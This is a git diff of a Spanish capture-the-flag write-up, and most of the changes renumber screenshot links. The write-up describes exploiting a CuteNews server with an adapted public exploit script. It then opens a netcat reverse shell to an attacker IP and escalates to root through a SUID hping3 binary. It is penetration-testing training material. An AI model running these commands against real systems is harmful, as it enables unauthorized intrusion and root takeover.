@@ -47,21 +47,23 @@ Le damos permisos de ejecución:
 
 ``chmod +x 48800.py``
 
-![7](Images/7.png)
 
 Antes de ejecutarlo, tenemos que fijarnos que hay rutas en el código que puede que no existan a nivel del servidor:
 
 - IP/CuteNews/cdata/users/ no existe
 
-![8](Images/8.png)
+![7](Images/7.png)
 
 - Pero IP/cdata/users, sí:
 
-![9](Images/9.png)
+
+![8](Images/8.png)
 
 Y lo mismo para todas aquellas rutas que partan de IP/CuteNews (como /uploads o /index.php), por lo que modificamos el código y lo adaptamos a nuestro escenario. Es decir, borramos la parte "CuteNews" de la url, puesto que el servidor web, en este caso, no contempla esa ruta.
 
 ``nano 48800.py``
+
+![9](Images/9.png)
 
 ![10](Images/10.png)
 
@@ -69,7 +71,7 @@ Y lo mismo para todas aquellas rutas que partan de IP/CuteNews (como /uploads o 
 
 ![12](Images/12.png)
 
-![13](Images/13.png)
+
 
 Una vez lo tenemos preparado, ejecutamos:
 
@@ -77,11 +79,13 @@ Una vez lo tenemos preparado, ejecutamos:
 
 -> Introducimos la URL
 
-![14](Images/14.png)
+![13](Images/13.png)
+
+
 
 Y nos permite ejecutar comandos de forma remota:
 
-![15](Images/15.png)
+![14](Images/14.png)
 
 Para mayor estabilidad, vamos a mandarnos una revshell.
 
@@ -93,11 +97,13 @@ Para mayor estabilidad, vamos a mandarnos una revshell.
 
 ``nc 192.168.45.210 4444 -e /bin/bash``
 
-![16](Images/16.png)
+![15](Images/15.png)
+
 
 - Si revisamos el listener:
 
-![17](Images/17.png)
+![16](Images/16.png)
+
 
 Estamos dentro como www-data.
 
@@ -105,31 +111,37 @@ Hacemos un tratamiento de la TTY y recogemos la flag de user en /var/www:
 
 ``whoami && ip addr && cat local.txt``
 
-![18](Images/18.png)
+![17](Images/17.png)
+
 
 
 # PRIVESC
 
 Se prueban diferentes escaladas básicas de Linux, pero al observar los permisos SUID en binarios, encontramos:
 
-![19](Images/19.png)
+![18](Images/18.png)
+
 
 No es común que el binario hping3 tenga permisos SUID. Vamos a echar un vistazo a GTFObins:
 
 https://gtfobins.github.io/gtfobins/hping3/#suid
 
-![20](Images/20.png)
+![19](Images/19.png)
+
 
 
 ``hping3``
 
 ``/bin/sh -p``
 
-![21](Images/21.png)
+![20](Images/20.png)
 
 Hemos escalado correctamente a root.
+
+
 
 En /root encontramos la flag de root.
 
 ``whoami && ip addr && cat proof.txt``
-![22](Images/22.png)
+
+![21](Images/21.png)
